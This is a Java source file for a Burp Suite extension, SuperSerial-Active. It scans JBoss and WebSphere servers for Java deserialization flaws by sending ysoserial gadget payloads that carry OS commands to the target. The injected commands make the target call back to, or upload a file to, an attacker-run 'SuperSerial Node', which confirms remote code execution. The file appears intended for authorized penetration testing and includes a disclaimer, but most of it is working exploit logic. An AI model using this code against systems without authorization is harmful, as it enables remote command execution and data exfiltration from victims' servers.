/*
	BurpExtender.java
	
	v0.3 (3/10/2016)
	
	SuperSerial-Active Scan check: Conduct active scan check that involves sending a request including a Java serialized object payload generated by ysoserial (v0.0.2) 
	containing an operating system command (from PayloadCommandFactory.java) to be executed on a target system. Based on the inputted IScannerInsertionPoint 
	parameter(s), either a) the base request will be converted to a POST request containing the payload in plaintext in the message body 
	(JBossSerializedInsertionPoint.java for JBoss target systems), or b) the payload will be base64-encoded and inserted into the appropriate request parameter(s) 
	(WebSphereSerializedInsertionPoint.java for WebSphere target systems). The operating system command included in the payload will force the target system to (via 
	HTTP) a) access the SuperSerial Node, or b) upload a file to the SuperSerial Node. After submitting the payload to the target system, the Active Scanner will 
	attempt to a) read the access entry from the SuperSerial node, or b) download the file that was uploaded by the target system. If this is successful, a new "Java 
	Deserialization Vulnerability" Scan Issue (SerializationRCEExploitIssue.java) will be created, displaying the request containing the successful payload, the 
	SuperSerial Node response containing the access entry or uploaded file, and details about the detection of the vulnerability and about the target system (web 
	server platform and operating system).
	
	Currently supports target systems running JBoss and WebSphere platforms only.
*/

package burp;

//standard includes
import java.util.List;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Hashtable;
import java.net.URL;

//third-party includes
import org.json.JSONObject;
import ysoserial.*;
import superserial.ui.SuperSerialConfigTab;
import superserial.settings.SuperSerialSettings;

public class BurpExtender implements IBurpExtender,IScannerCheck {
	//IBurpExtender fields
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;
	
	//Config UI fields
	private SuperSerialConfigTab configTab;
	
	//Settings Fields
	private SuperSerialSettings settings;
	private PayloadCommandFactory pcf;
	
	//SuperSerial node fields
	private IHttpService nodeHttpService;
	
	//constants
	private static final String JBOSS_INSERTION_POINT = "SuperSerial-JBoss";
	private static final String WEBSPHERE_INSERTION_POINT = "SuperSerial-WebSphere";
	private static final String[] payloadTypes = new String[] {"CommonsCollections1","CommonsCollections2","Groovy1","Spring1"}; //TODO: add support for >ysoserial-0.0.2
	//private static final String[] payloadTypes = new String[] {"CommonsCollections1"};
	
	//IBurpExtender methods
	@Override
	public void registerExtenderCallbacks(IBurpExtenderCallbacks mCallbacks) {
		callbacks = mCallbacks;
		helpers = callbacks.getHelpers();
		
		callbacks.setExtensionName("SuperSerial - Active");
		callbacks.registerScannerCheck(this);
		callbacks.registerScannerInsertionPointProvider(new SuperSerialInsertionPointProvider(helpers));
		
		settings = SuperSerialSettings.getInstance();
		//pcf = PayloadCommandFactory.getInstance();
		pcf = PayloadCommandFactory.getInstance(callbacks);
		
		configTab = new SuperSerialConfigTab(callbacks);
		callbacks.customizeUiComponent(configTab);
		callbacks.addSuiteTab(configTab);
				
		//display "Node not configured" warning, and display disclaimer
		callbacks.printOutput("Node settings uninitialized, set in "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"");
		callbacks.issueAlert("Node settings uninitialized, set in "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"");
		callbacks.printOutput("\nDisclaimer: This software is only intended to be used against systems the user explicitly owns or has authorization to test/attack. The developers"+
								" provide the software for free without warranty, and assume no responsibility for any damage caused to systems by misusing the software. It is "+
								"the responsibility of the user to abide by all local, state and federal laws while using the software.");
	}
	
	
	//IScannerCheck methods
	@Override //likely will not implement this method (passive check is handled by SuperSerial-Passive plugin)
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
		return null;
	}
	
	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,IScannerInsertionPoint insertionPoint) {
		List<IScanIssue> issues = null;
		String ipName = insertionPoint.getInsertionPointName();
		
		if(ipName.equals(JBOSS_INSERTION_POINT) || ipName.equals(WEBSPHERE_INSERTION_POINT)) { //insertion point is SuperSerial custom insertion point
			
			IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
			URL url = reqInfo.getUrl();
			String urlStr = url.getProtocol()+"://"+url.getHost()+":"+url.getPort()+url.getPath();
			if(!createNodeHttpService()) { //node settings invalid
				callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid Node connection settings! Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				callbacks.issueAlert("Invalid SuperSerial Node connection settings! Active Scans check will be skipped on "+url.getPath()+"! Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				return issues;
			}
			String host = settings.getNodeHost();
			int port = settings.getNodePort();
			boolean https = settings.getNodeHttps();
			String token = settings.getNodeToken();
			int downloadTries = settings.getDownloadTries();
			int waitTime = settings.getWaitTime();
			
			//request #1: create node context
			byte[] req = getNodeGetRequest("/queue",token);
			//callbacks.printError(new String(req));
			IHttpRequestResponse queueRR = callbacks.makeHttpRequest(nodeHttpService,req);
			byte[] resp = queueRR.getResponse();
			IResponseInfo respInfo = null;
			if(resp!=null) {
				respInfo = helpers.analyzeResponse(resp);
			} else { //connection to node failed (error/timeout)
				callbacks.printError("Active Scan checks aborted on "+urlStr+" due to failed failed Node Connection. Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				callbacks.issueAlert("Connection to Node failed during scanning! Active Scan checks on "+url.getPath()+" will be aborted! Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				configTab.setStatusError(SuperSerialConfigTab.CONN_ERROR_CODE,host,port,https,true);
				return issues;
			}
			if(respInfo!=null && respInfo.getStatusCode()==200) { //queue request completed successfully
				//callbacks.printError(new String(resp));
				
				//copy response data to string
				int dataStart = respInfo.getBodyOffset();
				byte[] dataArray = new byte[resp.length-dataStart];
				int i=dataStart;
				int j=0;
				while(i<resp.length) {
					dataArray[j] = resp[i];
					i++;
					j++;
				}
				String data = new String(dataArray);
				
				//parse response JSON
				JSONObject jsonObj = new JSONObject(data);
				String nodePath = (String) jsonObj.get("path");
				
				if(nodePath==null) { //will likely never happen: if Node does not return a context to use, issue error alert and abort active scan
					callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid Node connection settings! Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
					callbacks.issueAlert("Invalid SuperSerial Node connection settings! Active Scans check will be skipped on "+url.getPath()+"! Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
					return issues;
				}
				
				Hashtable[] commands = pcf.getCommandsArray();
				
				//if command array is empty, issue error alert and abort active scan
				if(commands.length==0) {
					callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid scan settings (no commands to test with)! Add at least one command in the "+configTab.getTabCaption()+"->\"Scan Settings\" tab!");
					callbacks.issueAlert("Invalid SuperSerial scan settings: no commands to test! Active scan checks will be skipped! Add at least one command in the "+configTab.getTabCaption()+"->\"Scan Settings\" tab!");
					return issues;
				}
				
				boolean nodeConnError = false; //whether a connection error/timeout occurred during scanning
				for(i=0;!nodeConnError && i<payloadTypes.length;i++) { //loop through payload types
					
					for(j=0;!nodeConnError && j<commands.length;j++) { //loop through commands, stop if node access/file upload is detected
					
						Hashtable cmdHT = commands[j];
						String cmd = (String) cmdHT.get("cmd");
						//callbacks.printError(urlStr+":\n\tType: "+payloadTypes[i]+"; cmd: "+cmd);
						
						cmd = makeCommand(cmd,nodePath,token);
						//callbacks.printError(payloadTypes[i]+": "+cmd);
						
						//Request #2: create payload using current technique, and send to target host
						String technique = payloadTypes[i];
						byte[] payload = GeneratePayload.getPayload(technique,cmd);
						req = insertionPoint.buildRequest(payload);
						//callbacks.printError((new String(req))+"\n\n");
						IHttpRequestResponse exploitRR = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),req);
						//callbacks.printError(new String(exploitRR.getResponse()));
						
						//create highlights for exploit payload request (but do not apply until later if vuln confirmed)
						int[] expReqHighlights = null;
						boolean encoded = false;
						String platform = null;
						int cmdStart = -1;
						int cmdEnd = -1;
						if(ipName.equals(JBOSS_INSERTION_POINT)) {
							cmdStart = helpers.indexOf(req,cmd.getBytes(),true,0,req.length);
							cmdEnd = cmdStart+cmd.length();
							platform = "JBoss";
						} else if(ipName.equals(WEBSPHERE_INSERTION_POINT)) {
							String encodedPayload = helpers.base64Encode(payload);
							cmdStart = helpers.indexOf(req,encodedPayload.getBytes(),true,0,req.length);
							if(cmdStart==-1) {
								encodedPayload = helpers.urlEncode(encodedPayload);
								cmdStart = helpers.indexOf(req,encodedPayload.getBytes(),true,0,req.length);
							}
							cmdEnd = cmdStart+encodedPayload.length();
							encoded = true;
							platform = "WebSphere";
						}
						if(cmdStart!=-1 && cmdEnd!=-1) { //highlight indexes were successfully created
							expReqHighlights = new int[] {cmdStart,cmdEnd};
						}
						
						//request #3: loop to retrieve uploaded file or access entry
						IHttpRequestResponse fileRR = null;
						int tryCount=0;
						boolean downloaded = false; //if file was successfully downloaded from node
						while(!downloaded && tryCount<downloadTries) {
							try {
								Thread.sleep(waitTime);
							} catch(Exception e) {
								//don't care, wait will be skipped this time
							}
							req = getNodeGetRequest(nodePath,token);
							//callbacks.printError(new String(req));
							fileRR = callbacks.makeHttpRequest(nodeHttpService,req);
							resp = fileRR.getResponse();
							//callbacks.printError(new String(resp));
							respInfo = null;
							if(resp!=null)
								respInfo = helpers.analyzeResponse(resp); 
							if(resp!=null && respInfo!=null) {
								if(respInfo.getStatusCode()==200) {
									downloaded = true;
									break;
								}
							} else { //error making request to node (timeout or failure)
								callbacks.printError("Active Scan checks aborted on "+urlStr+" due to failed failed Node Connection. Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
								callbacks.issueAlert("Connection to Node failed during scanning! Active Scan checks on "+url.getPath()+" will be aborted! Set settings in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
								configTab.setStatusError(SuperSerialConfigTab.CONN_ERROR_CODE,host,port,https,true);
								nodeConnError = true;
								break;
							}
							tryCount++;
						}
						
						if(downloaded) { //data was downloaded from node, check if data is expected
							issues = new ArrayList<IScanIssue>(1);
							
							boolean expected = Boolean.parseBoolean((String) cmdHT.get("upload")); //whether uploaded file (true) or access entry (false) is expected
							boolean uploaded = false; //whether data read from node is uploaded file (true) or access entry (false)
							
							//determine whether data read is uploaded file or access entry by reading response headers
							List<String> respHeaders = respInfo.getHeaders();
							Iterator<String> headersItr = respHeaders.iterator();
							String source = null;
							String time = null;
							while(headersItr.hasNext()) {
								String header = headersItr.next();
								String[] headerSplit = null;
								if(header.contains("Upload-")) { //if response contains Upload-Source and Upload-Time headers, uploaded file was downloaded
									headerSplit = header.split(":",2);
									if(source==null & headerSplit[0].equalsIgnoreCase("Upload-Source") && headerSplit.length>1) {
										source = headerSplit[1].trim();
										uploaded = true;
									} else if(time==null && headerSplit[0].equalsIgnoreCase("Upload-Time") && headerSplit.length>1) {
										time = headerSplit[1].trim();
										uploaded = true;
									}
								} else if(header.contains("Content-")) { //if response contains "Content-Type: application/json" header, access entry was downloaded
									headerSplit = header.split(":",2);
									if(headerSplit[0].equalsIgnoreCase("Content-Type") && headerSplit.length>1) {
										headerSplit[1] = headerSplit[1].trim();
										if(headerSplit[1].equalsIgnoreCase("application/json")) {
											uploaded = false;
										}
									}
								}
							}
							
							if(expected==uploaded) { //if data downloaded was as expected: vuln confirmed, report vuln
								//create exploit request highlight indices
								ArrayList<int[]> expReqHighlightsList = new ArrayList<int[]>(1);
								expReqHighlightsList.add(expReqHighlights);
								
								//if data is access entry, parse JSON
								if(!uploaded) {
									dataStart = respInfo.getBodyOffset();
									dataArray = new byte[resp.length-dataStart];
									int k=dataStart;
									int l=0;
									while(k<resp.length) {
										dataArray[l] = resp[k];
										k++;
										l++;
									}
									jsonObj = new JSONObject(new String(dataArray));
									source = (String) jsonObj.get("accessSource");
									time = (String) jsonObj.get("accessTime");
								}
								
								//create node response highlight indices
								ArrayList<int[]> nodeRespHighlightsList = new ArrayList<int[]>(3);
								int srcStart = helpers.indexOf(resp,source.getBytes(),true,0,resp.length);
								int timeStart = helpers.indexOf(resp,time.getBytes(),true,0,resp.length);
								if(srcStart<timeStart) { //source header comes first
									nodeRespHighlightsList.add(new int[] {srcStart,srcStart+source.length()});
									nodeRespHighlightsList.add(new int[] {timeStart,timeStart+time.length()});
								} else {
									nodeRespHighlightsList.add(new int[] {timeStart,timeStart+time.length()});
									nodeRespHighlightsList.add(new int[] {srcStart,srcStart+source.length()});
								}
								if(uploaded) { //if data is uploaded file, highlight file
									nodeRespHighlightsList.add(new int[] {respInfo.getBodyOffset(),resp.length});
								}
								
								//create highlighted request/response and create issue
								IHttpRequestResponseWithMarkers exploitRRWM = callbacks.applyMarkers(exploitRR,expReqHighlightsList,null);
								IHttpRequestResponseWithMarkers fileRRWM = callbacks.applyMarkers(fileRR,null,nodeRespHighlightsList);
								SerializationRCEExploitIssue issue = new SerializationRCEExploitIssue(exploitRRWM,fileRRWM,helpers.analyzeRequest(exploitRR).getUrl(),technique,cmd,encoded,source,time,platform,(String) cmdHT.get("os"),expected);
								issues.add(issue);
								return issues;
							}
						}
					}
				}
			} else { //queue request failed (wrong token)
				callbacks.printError("Active Scan checks aborted on "+urlStr+" due to failed failed Node Authentication. Set correct token in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				callbacks.issueAlert("Authentication to Node failed during scanning! Active Scan checks on "+url.getPath()+" will be aborted! Set correct token in the "+configTab.getTabCaption()+"->\"Node Connection Settings\" tab and click \"Test Connection\"!");
				configTab.setStatusError(SuperSerialConfigTab.AUTH_ERROR_CODE,host,port,https,true);
			}
		}
		
		//eventual TODO: if here is reached (no vulnerability detected), delete context on Node that was created for current scan.
		return issues;
	}
	
	//for now, do not report any new issues, only existing issue
	//eventual TODO: if old issue contains an access entry and new issue contains a file-upload, report new issue
	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue,IScanIssue newIssue) {
		return -1;
	}
	
	
	//custom helper methods
	
	//create new httpservice to be used for requests to node
	//false: failure creating new httpservice
	//true: success creating new httpservice (or identical httpservice already created)
	private boolean createNodeHttpService() {
		String host = settings.getNodeHost();
		int port = settings.getNodePort();
		boolean https = settings.getNodeHttps();
		
		if((host==null) || ((port<1) || (port>65535))) { //node settings not yet set or set incorrectly
			//callbacks.issueAlert("Attempt to set SuperSerial node settings failed: Invalid settings! (host: (null), port: "+Integer.toString(port));
			return false;
		} else if(host.isEmpty() || ((port<1) || (port>65535))) { //node settings not set correctly
			//callbacks.issueAlert("Attempt to set SuperSerial node settings failed: Invalid settings! (host: "+host+", port: "+Integer.toString(port));
			return false;
		}
		
		if(nodeHttpService==null) { //HttpService object not yet created, attempt to create			
			nodeHttpService = helpers.buildHttpService(host,port,https);
		} else { //HttpService object already created, compare to inputted settings and recreate if different
			String currHost = nodeHttpService.getHost();
			int currPort = nodeHttpService.getPort();
			String currHttps = nodeHttpService.getProtocol();
			if(!(currHost.equals(host) && (currPort==port) && (currHttps.equalsIgnoreCase("http"+(https ? "s" : ""))))) { //if already-created object is set differently than current settings
				nodeHttpService = helpers.buildHttpService(host,port,https);
			}
		}
		return true;
	}
	
	//create HTTP GET request to node
	private byte[] getNodeGetRequest(String nodePath,String nodeToken) {
		if(nodePath.charAt(0)!='/') nodePath = "/"+nodePath;
		String request = "GET "+nodePath+"?token="+nodeToken+" HTTP/1.1\r\nHost: "+nodeHttpService.getHost()+":"+Integer.toString(nodeHttpService.getPort())+"\r\n\r\n";
		return request.getBytes();
	}
	
	//replace command tokens (for host, port, protocol, etc) with correct values
	private String makeCommand(String cmd,String nodePath,String nodeToken) {
		cmd = cmd.replace("[NODEPROTOCOL]",nodeHttpService.getProtocol());
		cmd = cmd.replace("[NODEHOST]",nodeHttpService.getHost());
		cmd = cmd.replace("[NODEPORT]",Integer.toString(nodeHttpService.getPort()));
		cmd = cmd.replace("[NODEPATH]",nodePath); 
		cmd = cmd.replace("[NODETOKEN]",nodeToken);
		return cmd;
	}
}
